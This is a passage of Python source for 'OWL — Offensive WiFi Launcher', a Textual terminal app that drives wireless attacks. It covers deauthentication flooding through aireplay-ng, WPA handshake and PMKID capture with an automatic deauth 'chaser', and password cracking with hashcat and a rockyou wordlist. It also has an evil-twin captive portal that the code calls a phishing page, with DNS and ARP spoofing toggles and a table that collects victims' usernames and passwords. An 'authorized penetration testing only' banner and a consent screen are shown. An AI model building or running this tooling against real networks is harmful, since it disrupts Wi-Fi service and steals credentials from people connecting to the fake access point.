                yield Input(placeholder="wlan0mon",
                            value=ifaces[0] if ifaces else "wlan0mon", id="fl-iface")
            with Vertical():
                yield Static("[dim]TARGET BSSID (blank = broadcast all)[/dim]", markup=True)
                yield Input(placeholder="AA:BB:CC:DD:EE:FF", id="fl-bssid")
            with Vertical():
                yield Static("[dim]PACKET COUNT (0 = ∞)[/dim]", markup=True)
                yield Input(placeholder="0", value="500", id="fl-count")
            with Vertical():
                yield Static("[dim]BURST SIZE[/dim]", markup=True)
                yield Input(placeholder="20", value="20", id="fl-burst")

        with Horizontal(classes="owl-card"):
            with Horizontal():
                yield Static("[dim]Channel-hop: [/dim]", markup=True)
                yield Switch(id="fl-hop",      value=True)
            with Horizontal():
                yield Static("  [dim]Adaptive burst: [/dim]", markup=True)
                yield Switch(id="fl-adaptive", value=True)

        with Horizontal():
            yield Button("▶▶ START FLOOD",    id="fl-start", variant="warning")
            yield Button("⛔ EMERGENCY STOP", id="fl-stop",  variant="error")

        yield Static(
            "[dim]Packets: [/dim][bold cyan]0[/bold cyan]   "
            "[dim]Rate: [/dim][bold cyan]0 pkt/s[/bold cyan]",
            id="fl-counter", markup=True,
        )
        with Horizontal(classes="owl-card"):
            with Vertical():
                yield Static("[bold red]FLOOD STATUS[/bold red]", classes="card-title", markup=True)
                yield Static("[dim]Idle[/dim]", id="fl-status", markup=True)
            with Vertical():
                yield Static("[bold red]CURRENT CHANNEL[/bold red]", classes="card-title", markup=True)
                yield Static("[dim]—[/dim]", id="fl-ch", markup=True)

        yield Static("\n  [dim]Created by Sharon Anil · OWL-FLOOD v1.0[/dim]", markup=True)

    @on(Button.Pressed, "#fl-start")
    def start(self) -> None:
        if not self._running:
            self._stop_evt = asyncio.Event()
            self._running  = True
            self._pkt_count = 0
            self.run_flood()

    @on(Button.Pressed, "#fl-stop")
    def stop(self) -> None:
        if self._stop_evt:
            self._stop_evt.set()
        self._running = False
        t = self.app.query_one("#terminal-log", TerminalLog)
        t.error(f"[{ts()}] [!!!] EMERGENCY STOP — {self._pkt_count} packets sent.")
        try:
            self.query_one("#fl-status", Static).update("[red]STOPPED[/red]")
        except Exception:
            pass

    @work(exclusive=True)
    async def run_flood(self) -> None:
        terminal = self.app.query_one("#terminal-log", TerminalLog)
        iface    = self.query_one("#fl-iface",   Input).value.strip() or "wlan0mon"
        bssid    = self.query_one("#fl-bssid",   Input).value.strip() or "FF:FF:FF:FF:FF:FF"
        adaptive = self.query_one("#fl-adaptive",Switch).value
        hop      = self.query_one("#fl-hop",     Switch).value

        try:
            total = int(self.query_one("#fl-count", Input).value or 0)
            burst = int(self.query_one("#fl-burst", Input).value or 20)
        except ValueError:
            total, burst = 500, 20

        counter_w = self.query_one("#fl-counter", Static)
        status_w  = self.query_one("#fl-status",  Static)
        ch_w      = self.query_one("#fl-ch",      Static)

        terminal.warn(f"[{ts()}] [!] OWL-FLOOD starting — {bssid} on {iface}")
        status_w.update("[red]● FLOODING[/red]")

        def cb(color: str, msg: str) -> None:
            terminal.callback(color, msg)

        # Live flood — this streams real aireplay-ng output
        await live.live_flood(
            iface, bssid, total, burst, cb, self._stop_evt
        )

        self._running = False
        status_w.update("[dim]Idle[/dim]")


# ═══════════════════════════════════════════════════════════════════════════════
#  HARVEST
# ═══════════════════════════════════════════════════════════════════════════════

class HarvestPage(Widget):
    _stop_evt: asyncio.Event | None = None

    def compose(self) -> ComposeResult:
        yield Static(MODULE_BANNERS["harvest"], markup=True)
        with Horizontal(classes="owl-card"):
            with Vertical():
                yield Static("[dim]INTERFACE (monitor mode)[/dim]", markup=True)
                ifaces = net.list_wifi_interfaces()
                yield Input(placeholder="wlan0mon",
                            value=ifaces[0] if ifaces else "wlan0mon", id="hv-iface")
            with Vertical():
                yield Static("[dim]TARGET AP BSSID[/dim]", markup=True)
                yield Input(placeholder="AA:BB:CC:DD:EE:FF", id="hv-bssid")
            with Vertical():
                yield Static("[dim]SSID[/dim]", markup=True)
                yield Input(placeholder="NetworkName", id="hv-ssid")
            with Vertical():
                yield Static("[dim]CHANNEL[/dim]", markup=True)
                yield Input(placeholder="6", value="6", id="hv-ch")

        with Horizontal(classes="owl-card"):
            with Horizontal():
                yield Static("[dim]Auto-chaser: [/dim]", markup=True)
                yield Switch(id="hv-chaser", value=True)
            with Horizontal():
                yield Static("  [dim]PMKID capture: [/dim]", markup=True)
                yield Switch(id="hv-pmkid", value=True)
            with Horizontal():
                yield Static("  [dim]Auto target-switch: [/dim]", markup=True)
                yield Switch(id="hv-autoswitch", value=False)

        with Horizontal():
            yield Button("⬤ START HARVEST", id="hv-start",  variant="success")
            yield Button("■ STOP",           id="hv-stop",   variant="error")
            yield Button("⊕ EXPORT",         id="hv-export", variant="primary")

        yield Static("\n[bold magenta]CAPTURE FILES[/bold magenta]", markup=True)
        yield DataTable(id="hv-caps")

        yield Static("\n[bold cyan]CRACK PANEL[/bold cyan]", markup=True)
        with Horizontal(classes="owl-card"):
            with Vertical():
                yield Static("[dim]Capture file[/dim]", markup=True)
                yield Input(placeholder="/root/owl_captures/capture.cap", id="hv-cap-file")
            with Vertical():
                yield Static("[dim]Wordlist[/dim]", markup=True)
                yield Input(value="/usr/share/wordlists/rockyou.txt", id="hv-wordlist")
            with Vertical():
                yield Static("[dim]Tool[/dim]", markup=True)
                yield Select(
                    [("hashcat (PMKID 22000)", "hashcat"),
                     ("aircrack-ng (HCCAPX)",  "aircrack")],
                    value="hashcat", id="hv-crack-tool",
                )
        with Horizontal():
            yield Button("⚡ CRACK HANDSHAKE", id="hv-crack", variant="warning")

        yield Static("\n  [dim]Created by Sharon Anil · OWL-HARVEST v1.0[/dim]", markup=True)

    def on_mount(self) -> None:
        t = self.query_one("#hv-caps", DataTable)
        t.add_columns("FILENAME", "SSID", "BSSID", "SIZE", "STATUS", "PSK")

    @on(Button.Pressed, "#hv-start")
    def start(self) -> None:
        self._stop_evt = asyncio.Event()
        self.run_harvest()

    @work(exclusive=True)
    async def run_harvest(self) -> None:
        terminal  = self.app.query_one("#terminal-log", TerminalLog)
        iface     = self.query_one("#hv-iface", Input).value.strip() or "wlan0mon"
        bssid     = self.query_one("#hv-bssid", Input).value.strip()
        ssid      = self.query_one("#hv-ssid",  Input).value.strip() or "Unknown"
        chaser    = self.query_one("#hv-chaser",Switch).value

        try:
            ch = int(self.query_one("#hv-ch", Input).value or 6)
        except ValueError:
            ch = 6

        if not bssid:
            terminal.error(f"[{ts()}] [✗] Target BSSID required.")
            return

        out_dir = str(Path.home() / "owl_captures")
        terminal.info(f"[{ts()}] [*] OWL-HARVEST — {ssid} ({bssid}) ch{ch}")

        cap_path = await live.live_harvest(
            iface, bssid, ch, out_dir, terminal.callback, self._stop_evt
        )

        if cap_path:
            size_kb = cap_path.stat().st_size // 1024
            tbl = self.query_one("#hv-caps", DataTable)
            tbl.add_row(
                cap_path.name, ssid, bssid,
                f"{size_kb} KB",
                Text.from_markup("[green]CAPTURED[/green]"),
                "[dim]—[/dim]",
            )
            self.query_one("#hv-cap-file", Input).value = str(cap_path)

            # Auto-chaser: send deauth to force reconnect
            if chaser:
                terminal.spoof(f"[{ts()}] [~] Chaser deauth → {bssid} (force reconnect)")
                await live.live_deauth(iface, bssid, "", 5, "0x03", terminal.callback)

    @on(Button.Pressed, "#hv-stop")
    def stop(self) -> None:
        if self._stop_evt:
            self._stop_evt.set()
        self.app.query_one("#terminal-log", TerminalLog).warn(
            f"[{ts()}] [!] HARVEST stopped."
        )

    @on(Button.Pressed, "#hv-crack")
    def crack(self) -> None:
        self.run_crack()

    @work(exclusive=True)
    async def run_crack(self) -> None:
        terminal  = self.app.query_one("#terminal-log", TerminalLog)
        cap_file  = self.query_one("#hv-cap-file",  Input).value.strip()
        wordlist  = self.query_one("#hv-wordlist",   Input).value.strip()

        if not cap_file or not Path(cap_file).exists():
            terminal.error(f"[{ts()}] [✗] Capture file not found: {cap_file}")
            return
        if not Path(wordlist).exists():
            terminal.warn(f"[{ts()}] [!] Wordlist not found: {wordlist}")

        psk = await live.live_crack_hashcat(cap_file, wordlist, terminal.callback)
        if psk:
            tbl = self.query_one("#hv-caps", DataTable)
            tbl.add_row(
                Path(cap_file).name, "[cracked]", "—", "—",
                Text.from_markup("[bold green]CRACKED[/bold green]"),
                Text.from_markup(f"[bold yellow]{psk}[/bold yellow]"),
            )

    @on(Button.Pressed, "#hv-export")
    def export(self) -> None:
        t = self.app.query_one("#terminal-log", TerminalLog)
        out = Path.home() / "owl_captures"
        t.success(f"[{ts()}] [+] Captures saved to {out}/")


# ═══════════════════════════════════════════════════════════════════════════════
#  PORTAL
# ═══════════════════════════════════════════════════════════════════════════════

class PortalPage(Widget):
    _procs: list = []

    def compose(self) -> ComposeResult:
        yield Static(MODULE_BANNERS["portal"], markup=True)
        with Horizontal(classes="owl-card"):
            with Vertical():
                yield Static("[dim]CLONE SSID (evil twin name)[/dim]", markup=True)
                yield Input(placeholder="TargetNetworkName", id="po-ssid")
            with Vertical():
                yield Static("[dim]CHANNEL[/dim]", markup=True)
                yield Input(placeholder="6", value="6", id="po-ch")
            with Vertical():
                yield Static("[dim]AP INTERFACE[/dim]", markup=True)
                ifaces = net.list_wifi_interfaces()
                yield Input(placeholder="wlan1",
                            value=ifaces[-1] if len(ifaces) > 1 else "wlan1", id="po-iface")
            with Vertical():
                yield Static("[dim]GATEWAY IP[/dim]", markup=True)
                yield Input(placeholder="192.168.99.1", value="192.168.99.1", id="po-gw")

        with Horizontal(classes="owl-card"):
            with Horizontal():
                yield Static("[dim]DNS spoof: [/dim]", markup=True)
                yield Switch(id="po-dns",  value=True)
            with Horizontal():
                yield Static("  [dim]ARP spoof: [/dim]", markup=True)
                yield Switch(id="po-arp",  value=False)
            with Horizontal():
                yield Static("  [dim]MITM hook: [/dim]", markup=True)
                yield Switch(id="po-mitm", value=False)

        yield Static("\n[dim]CAPTIVE PORTAL HTML (edit to customize phishing page)[/dim]", markup=True)
        yield TextArea(text=CAPTIVE_PORTAL_HTML, id="po-editor", language="html")

        with Horizontal():
            yield Button("⛃ START PORTAL",    id="po-start",    variant="success")
            yield Button("⊞ GEN HOSTAPD CFG", id="po-hostapd")
            yield Button("⊞ GEN DNSMASQ CFG", id="po-dnsmasq")
            yield Button("■ STOP ALL",         id="po-stop",     variant="error")

        yield Static("\n[bold green]CAPTURED CREDENTIALS[/bold green]", markup=True)
        yield DataTable(id="po-creds")

        yield Static("\n  [dim]Created by Sharon Anil · OWL-PORTAL v1.0[/dim]", markup=True)

    def on_mount(self) -> None:
        t = self.query_one("#po-creds", DataTable)
        t.add_columns("TIME", "IP", "MAC", "USERNAME", "PASSWORD", "DEVICE")

    @on(Button.Pressed, "#po-start")
    def start_portal(self) -> None:
        self.run_portal()

    @work(exclusive=True)
    async def run_portal(self) -> None:
        terminal = self.app.query_one("#terminal-log", TerminalLog)
        ssid     = self.query_one("#po-ssid",  Input).value.strip()
        iface    = self.query_one("#po-iface", Input).value.strip() or "wlan1"
        arp      = self.query_one("#po-arp",   Switch).value
        mitm     = self.query_one("#po-mitm",  Switch).value

        try:
            ch = int(self.query_one("#po-ch", Input).value or 6)
        except ValueError:
            ch = 6

        if not ssid:
            terminal.error(f"[{ts()}] [✗] SSID required for evil twin.")
            return

        # Start evil twin (hostapd + dnsmasq)
        self._procs = await live.start_evil_twin(iface, ssid, ch, terminal.callback)

        if arp:
            terminal.spoof(f"[{ts()}] [~] ARP spoof would be enabled here (add arpspoof)")
        if mitm:
            terminal.spoof(f"[{ts()}] [~] MITM hook armed — intercept SSL/TLS traffic")

        terminal.success(f"[{ts()}] [+] OWL-PORTAL running. Waiting for victims on \"{ssid}\"")

    @on(Button.Pressed, "#po-hostapd")
    def gen_hostapd(self) -> None:
        ssid  = self.query_one("#po-ssid",  Input).value.strip() or "TargetSSID"
        iface = self.query_one("#po-iface", Input).value.strip() or "wlan1"
        ch    = self.query_one("#po-ch",    Input).value.strip() or "6"
        cfg   = live.generate_hostapd_conf(iface, ssid, int(ch))
        path  = Path("/tmp/owl_hostapd.conf")
        path.write_text(cfg)
        t = self.app.query_one("#terminal-log", TerminalLog)
        t.info(f"[{ts()}] [*] hostapd config → {path}")
        for line in cfg.strip().splitlines():
            t.dim(f"    {line}")
        t.success(f"[{ts()}] [+] Written to {path}")

    @on(Button.Pressed, "#po-dnsmasq")
    def gen_dnsmasq(self) -> None:
        iface = self.query_one("#po-iface", Input).value.strip() or "wlan1"
        gw    = self.query_one("#po-gw",    Input).value.strip() or "192.168.99.1"
        cfg   = live.generate_dnsmasq_conf(iface, gw)
        path  = Path("/tmp/owl_dnsmasq.conf")
        path.write_text(cfg)
        t = self.app.query_one("#terminal-log", TerminalLog)
        t.info(f"[{ts()}] [*] dnsmasq config → {path}")
        for line in cfg.strip().splitlines():
            t.dim(f"    {line}")
        t.success(f"[{ts()}] [+] Written to {path}")

    @on(Button.Pressed, "#po-stop")
    def stop_portal(self) -> None:
        t = self.app.query_one("#terminal-log", TerminalLog)
        for p in self._procs:
            try:
                p.terminate()
            except Exception:
                pass
        self._procs.clear()
        t.warn(f"[{ts()}] [!] OWL-PORTAL stopped. hostapd + dnsmasq terminated.")


# ═══════════════════════════════════════════════════════════════════════════════
#  SETTINGS
# ═══════════════════════════════════════════════════════════════════════════════

class SettingsPage(Widget):
    def compose(self) -> ComposeResult:
        yield Static(MODULE_BANNERS["settings"], markup=True)

        with Horizontal(classes="owl-card"):
            with Vertical():
                yield Static("[bold yellow]INTERFACE ASSIGNMENT[/bold yellow]", markup=True)
                yield Static("[dim]Deauth / Flood NIC[/dim]", markup=True)
                yield Input(placeholder="wlan0mon", value="wlan0mon", id="cfg-da-nic")
                yield Static("[dim]Capture NIC[/dim]", markup=True)
                yield Input(placeholder="wlan0", value="wlan0",   id="cfg-cap-nic")
                yield Static("[dim]Portal / AP NIC[/dim]", markup=True)
                yield Input(placeholder="wlan1", value="wlan1",   id="cfg-po-nic")
            with Vertical():
                yield Static("[bold yellow]LOGGING & PATHS[/bold yellow]", markup=True)
                yield Select(
                    [("DEBUG", "DEBUG"), ("INFO", "INFO"),
                     ("WARN", "WARN"),   ("ERROR", "ERROR")],
                    value="INFO", id="cfg-log-level",
                )
                yield Static("[dim]Evidence export dir[/dim]", markup=True)
                yield Input(value="/tmp/owl_evidence", id="cfg-export-dir")
                yield Static("[dim]Hashcat wordlist[/dim]", markup=True)
                yield Input(value="/usr/share/wordlists/rockyou.txt", id="cfg-wordlist")

        # Health checks
        yield Static("\n[bold yellow]HEALTH CHECKS[/bold yellow]", markup=True)
        with Horizontal(classes="owl-card"):
            yield Static("[dim]monitor-mode[/dim] [yellow]IDLE[/yellow]", id="hc-mon",  markup=True)
            yield Static("[dim]injection[/dim]     [yellow]IDLE[/yellow]", id="hc-inj",  markup=True)
            yield Static("[dim]channel-lock[/dim]  [yellow]IDLE[/yellow]", id="hc-ch",   markup=True)
            yield Static("[dim]driver[/dim]        [yellow]IDLE[/yellow]", id="hc-drv",  markup=True)
        with Horizontal():
            yield Button("✓ MONITOR MODE", id="hc-btn-mon")
            yield Button("✓ INJECTION",    id="hc-btn-inj")
            yield Button("✓ CHANNEL LOCK", id="hc-btn-ch")
            yield Button("✓ ALL CHECKS",   id="hc-btn-all", variant="warning")

        # Wireless interfaces
        yield Static("\n[bold yellow]DETECTED INTERFACES[/bold yellow]", markup=True)
        yield DataTable(id="cfg-ifaces")

        # Tool detection
        yield Static("\n[bold yellow]TOOL DETECTION[/bold yellow]", markup=True)
        yield DataTable(id="cfg-tools")

        # YAML editor
        yield Static("\n[bold yellow]YAML CONFIG PROFILE[/bold yellow]", markup=True)
        yield TextArea(text=DEFAULT_YAML_CFG, id="cfg-yaml", language="yaml")
        with Horizontal():
            yield Button("💾 SAVE CONFIG",         id="cfg-save",     variant="success")
            yield Button("📂 LOAD CONFIG",         id="cfg-load")
            yield Button("⊕ EXPORT EVIDENCE",      id="cfg-evidence", variant="primary")
            yield Button("⚠ RESTORE MANAGED MODE", id="cfg-restore",  variant="error")
            yield Button("ℹ ABOUT OWL",            id="cfg-about")

        yield Static(
            "\n[bold white]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold white]\n"
            "[bold yellow]◉ CREATED BY SHARON ANIL[/bold yellow]  ·  "
            "[dim cyan]OWL — Offensive WiFi Launcher v1.0 · LIVE MODE[/dim cyan]\n"
            "[dim]For authorized penetration testing only.[/dim]\n"
            "[bold white]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold white]",
            markup=True,
        )

    def on_mount(self) -> None:
        # Interfaces table
        t = self.query_one("#cfg-ifaces", DataTable)
        t.add_columns("INTERFACE", "MODE", "MAC", "DRIVER", "CH", "TX POWER")
        ifaces = net.list_wifi_interfaces()
        for iface in ifaces[:8]:
            info = net.get_interface_info(iface)
            t.add_row(iface, info["mode"], info["mac"] or "—",
                      info["driver"] or "—",
                      str(info["channel"]) if info["channel"] else "—",
                      f"{info['txpower']:.0f} dBm" if info["txpower"] else "—")

        # Tools table
        tt = self.query_one("#cfg-tools", DataTable)
        tt.add_columns("TOOL", "PATH", "AVAILABLE", "VERSION")
        lv = live.check_live_available()
        import shutil as _sh
        for tool, avail in list(lv["tools"].items()) + list(lv["optional"].items()):
            path  = _sh.which(tool) or "—"
            flag  = "[green]YES[/green]" if avail else "[red]NO[/red]"
            ver   = net.get_tool_version(tool) if avail else "—"
            tt.add_row(tool, path, Text.from_markup(flag), ver[:50])

    def _hc(self, label: str, stat_id: str) -> None:
        t  = self.app.query_one("#terminal-log", TerminalLog)
        iface = "wlan0mon"
        t.info(f"[{ts()}] [*] Health check: {label}...")
        # Run actual iw check
        info = net.get_interface_info(iface)
        if label == "monitor-mode":
            ok = info["monitor"]
        elif label == "injection":
            ok = info["injection"]
        elif label == "channel-lock":
            ok = info["channel"] > 0
        else:
            ok = info["exists"]
        color = "green" if ok else "red"
        result = "PASS" if ok else "FAIL"
        t._log(color, f"[{ts()}] [{'+'  if ok else '✗'}] {label.upper()}: {result}")
        try:
            self.query_one(stat_id, Static).update(
                Text.from_markup(f"[dim]{label}[/dim]  [{color}]{result}[/{color}]")
            )
        except Exception:
            pass

    @on(Button.Pressed, "#hc-btn-mon")
    def hc_mon(self) -> None: self._hc("monitor-mode", "#hc-mon")
    @on(Button.Pressed, "#hc-btn-inj")
    def hc_inj(self) -> None: self._hc("injection",    "#hc-inj")
    @on(Button.Pressed, "#hc-btn-ch")
    def hc_ch(self)  -> None: self._hc("channel-lock", "#hc-ch")
    @on(Button.Pressed, "#hc-btn-all")
    def hc_all(self) -> None:
        for lbl, sid in [("monitor-mode","#hc-mon"),("injection","#hc-inj"),
                         ("channel-lock","#hc-ch"), ("driver",   "#hc-drv")]:
            self._hc(lbl, sid)

    @on(Button.Pressed, "#cfg-save")
    def save_cfg(self) -> None:
        path = Path.home() / ".owl_config.yaml"
        try:
            path.write_text(self.query_one("#cfg-yaml", TextArea).text)
            self.app.query_one("#terminal-log", TerminalLog).success(
                f"[{ts()}] [+] Config saved to {path}")
        except Exception as e:
            self.app.query_one("#terminal-log", TerminalLog).error(
                f"[{ts()}] [✗] Save failed: {e}")

    @on(Button.Pressed, "#cfg-load")
    def load_cfg(self) -> None:
        path = Path.home() / ".owl_config.yaml"
        t = self.app.query_one("#terminal-log", TerminalLog)
        if path.exists():
            self.query_one("#cfg-yaml", TextArea).load_text(path.read_text())
            t.success(f"[{ts()}] [+] Config loaded from {path}")
        else:
            t.warn(f"[{ts()}] [!] No saved config at {path}")

    @on(Button.Pressed, "#cfg-evidence")
    def export_ev(self) -> None:
        t = self.app.query_one("#terminal-log", TerminalLog)
        out = live.export_evidence(self.app._state,
                                   self.query_one("#cfg-export-dir", Input).value)
        t.success(f"[{ts()}] [+] Evidence exported to {out}")

    @on(Button.Pressed, "#cfg-restore")
    def restore_managed(self) -> None:
        self.do_restore()

    @work
    async def do_restore(self) -> None:
        t = self.app.query_one("#terminal-log", TerminalLog)
        t.warn(f"[{ts()}] [!] Restoring all interfaces to managed mode...")
        for iface in net.list_wifi_interfaces():
            await live.disable_monitor_mode(iface, t.callback)

    @on(Button.Pressed, "#cfg-about")
    def show_about(self) -> None:
        self.app.push_screen(AboutModal())


# ═══════════════════════════════════════════════════════════════════════════════
#  PAGE REGISTRY
# ═══════════════════════════════════════════════════════════════════════════════

PAGES: dict[str, tuple[str, str, type]] = {
    "dashboard": ("DASHBOARD",   "⬡",  DashboardPage),
    "recon":     ("OWL-RECON",   "◎",  ReconPage),
    "deauth":    ("OWL-DEAUTH",  "⚡", DeauthPage),
    "flood":     ("OWL-FLOOD",   "▶▶", FloodPage),
    "harvest":   ("OWL-HARVEST", "⬤", HarvestPage),
    "portal":    ("OWL-PORTAL",  "⛃", PortalPage),
    "settings":  ("SETTINGS",    "⚙",  SettingsPage),
}

# ═══════════════════════════════════════════════════════════════════════════════
#  MAIN APP
# ═══════════════════════════════════════════════════════════════════════════════

class OWLApp(App):
    CSS   = OWL_CSS
    TITLE = "OWL — Offensive WiFi Launcher v1.0 [LIVE]"

    BINDINGS = [
        Binding("1", "nav_dashboard", "Dashboard"),
        Binding("2", "nav_recon",     "Recon"),
        Binding("3", "nav_deauth",    "Deauth"),
        Binding("4", "nav_flood",     "Flood"),
        Binding("5", "nav_harvest",   "Harvest"),
        Binding("6", "nav_portal",    "Portal"),
        Binding("7", "nav_settings",  "Settings"),
        Binding("ctrl+t", "toggle_terminal", "Terminal"),
        Binding("ctrl+a", "show_about",      "About"),
        Binding("ctrl+e", "export_evidence", "Export"),
        Binding("q",      "quit",            "Quit"),
    ]

    current_page: reactive[str] = reactive("dashboard")

    def __init__(self) -> None:
        super().__init__()
        self._state = load_state()

    def compose(self) -> ComposeResult:
        with Horizontal(id="app-layout"):

            # ── Sidebar ──────────────────────────────────────────────────────
            with Vertical(id="sidebar"):
                yield Static(
                    "  ◉ [bold yellow]OWL[/bold yellow]\n"
                    "  [dim cyan]Offensive WiFi Launcher[/dim cyan]\n"
                    "  [dim]v1.0 · [green]LIVE MODE[/green][/dim]\n"
                    "  [dim]Created by Sharon Anil[/dim]",
                    id="sidebar-logo", markup=True,
                )
                for page_id, (label, icon, _) in PAGES.items():
                    yield Button(
                        f"{icon}  {label}",
                        id=f"nav-{page_id}",
                        classes=f"nav-item {'active' if page_id == 'dashboard' else ''}",
                    )

                # Live status in sidebar
                ifaces = net.list_wifi_interfaces()
                lv     = live.check_live_available()
                tools_ok = all(lv["tools"].values())
                yield Static(
                    f"\n  [dim]Interfaces:[/dim] [{'cyan' if ifaces else 'red'}]{', '.join(ifaces[:2]) if ifaces else 'none'}[/{'cyan' if ifaces else 'red'}]\n"
                    f"  [dim]Tools:[/dim]      [{'green' if tools_ok else 'red'}]{'OK' if tools_ok else 'MISSING'}[/{'green' if tools_ok else 'red'}]\n"
                    f"  [dim]Root:[/dim]       [green]YES[/green]",
                    id="sidebar-status", markup=True,
                )
                yield Static(
                    "  [dim]Keys: [yellow]1-7[/yellow] pages[/dim]\n"
                    "  [dim]      [yellow]Ctrl+T[/yellow] terminal[/dim]\n"
                    "  [dim]      [yellow]Q[/yellow] quit[/dim]\n"
                    "  [dim cyan]OWL v1.0 · Sharon Anil[/dim cyan]",
                    id="sidebar-footer", markup=True,
                )

            # ── Main area ─────────────────────────────────────────────────────
            with Vertical(id="main-area"):
                with Horizontal(id="top-bar"):
                    yield Button("⌂ DASHBOARD", id="btn-back-dashboard",
                                 classes="back-btn hidden")
                    yield Static("", id="top-bar-title", markup=True)
                    yield Static("[bold green]◉ LIVE MODE[/bold green]",
                                 id="top-bar-mode", markup=True)
                    yield Static("", id="top-bar-time", markup=True)

                with ScrollableContainer(id="content-area"):
                    yield DashboardPage( id="page-dashboard")
                    yield ReconPage(     id="page-recon",    classes="hidden")
                    yield DeauthPage(    id="page-deauth",   classes="hidden")
                    yield FloodPage(     id="page-flood",    classes="hidden")
                    yield HarvestPage(   id="page-harvest",  classes="hidden")
                    yield PortalPage(    id="page-portal",   classes="hidden")
                    yield SettingsPage(  id="page-settings", classes="hidden")

                with Container(id="terminal-area"):
                    yield TerminalLog(id="terminal-log", markup=True)

        yield Footer()

    def on_mount(self) -> None:
        if not self._state.get("consent_given", False):
            self.push_screen(AuthGateScreen(), callback=self._on_consent)
        else:
            self._boot_sequence()
        self.set_interval(1, self._update_clock)
        self._update_nav()
        self._update_top_bar()

    def _on_consent(self, result: bool | None) -> None:
        if result:
            give_consent(self._state)
            self._boot_sequence()
        else:
            self.exit()

    @work
    async def _boot_sequence(self) -> None:
        terminal = self.query_one("#terminal-log", TerminalLog)
        await asyncio.sleep(0.1)
        terminal.banner()
        for color, line in TERMINAL_BOOT_LINES:
            terminal.callback(color.strip("[]"), line)
            await asyncio.sleep(0.1)
        lv = live.check_live_available()
        if lv["live_ready"]:
            terminal.success(f"[{ts()}] [+] LIVE MODE active — all tools present, running as root.")
        else:
            # Shouldn't reach here due to preflight, but just in case
            missing = [t for t, ok in lv["tools"].items() if not ok]
            terminal.warn(f"[{ts()}] [!] Some tools missing: {', '.join(missing)}")
        ifaces = net.list_wifi_interfaces()
        terminal.info(f"[{ts()}] [*] Wireless interfaces: {', '.join(ifaces) if ifaces else 'NONE FOUND'}")
        terminal.success(f"[{ts()}] [+] OWL v1.0 ready. Welcome, operator.")
        terminal.dim("─" * 72)

    def _update_clock(self) -> None:
        try:
            self.query_one("#top-bar-time", Static).update(
                f"[dim]{datetime.now().strftime('%H:%M:%S')}[/dim]"
            )
        except Exception:
            pass

    def _update_top_bar(self) -> None:
        label, icon, _ = PAGES.get(self.current_page, ("OWL", "◉", None))
        try:
            self.query_one("#top-bar-title", Static).update(
                f"[bold yellow]{icon}  {label}[/bold yellow]"
            )
        except Exception:
            pass

    def _update_nav(self) -> None:
        for page_id in PAGES:
            try:
                item = self.query_one(f"#nav-{page_id}", Button)
                label, icon, _ = PAGES[page_id]
                active = page_id == self.current_page
                item.label = f"{icon}  {label}"
                item.add_class("active") if active else item.remove_class("active")
            except Exception:
                pass

    def switch_page(self, page_id: str) -> None:
        if page_id not in PAGES:
            return
        try:
            self.query_one(f"#page-{self.current_page}").add_class("hidden")
        except Exception:
            pass
        try:
            self.query_one(f"#page-{page_id}").remove_class("hidden")
        except Exception:
            pass
        self.current_page = page_id
        self._update_nav()
        self._update_top_bar()
        # Show back button on every page except dashboard
        try:
            back_btn = self.query_one("#btn-back-dashboard", Button)
            if page_id == "dashboard":
                back_btn.add_class("hidden")
            else:
                back_btn.remove_class("hidden")
        except Exception:
            pass

    def on_button_pressed(self, event: Button.Pressed) -> None:
        wid = event.button.id or ""
        if wid.startswith("nav-"):
            self.switch_page(wid[4:])
            event.stop()
        elif wid == "btn-back-dashboard":
            self.switch_page("dashboard")
            event.stop()

    def action_nav_dashboard(self) -> None: self.switch_page("dashboard")
    def action_nav_recon(self)     -> None: self.switch_page("recon")
    def action_nav_deauth(self)    -> None: self.switch_page("deauth")
    def action_nav_flood(self)     -> None: self.switch_page("flood")
    def action_nav_harvest(self)   -> None: self.switch_page("harvest")
    def action_nav_portal(self)    -> None: self.switch_page("portal")
    def action_nav_settings(self)  -> None: self.switch_page("settings")

    def action_toggle_terminal(self) -> None:
        try:
            term = self.query_one("#terminal-area")
            if "hidden" in term.classes:
                term.remove_class("hidden")
            else:
                term.add_class("hidden")
        except Exception:
            pass

    def action_show_about(self) -> None:
        self.push_screen(AboutModal())

    def action_export_evidence(self) -> None:
        t = self.query_one("#terminal-log", TerminalLog)
        try:
            out = live.export_evidence(self._state, "/tmp/owl_evidence")
            t.success(f"[{ts()}] [+] Evidence → {out}")
        except Exception as e:
            t.error(f"[{ts()}] [✗] Export failed: {e}")

    def action_quit(self) -> None:
        terminal = self.query_one("#terminal-log", TerminalLog)
        terminal.warn(f"[{ts()}] [!] OWL shutting down — restoring interfaces...")
        self.exit()


# ═══════════════════════════════════════════════════════════════════════════════
#  ENTRY POINT
# ═══════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    if sys.version_info < (3, 10):
        print("ERROR: OWL requires Python 3.10+", file=sys.stderr)
        sys.exit(1)
    OWLApp().run()
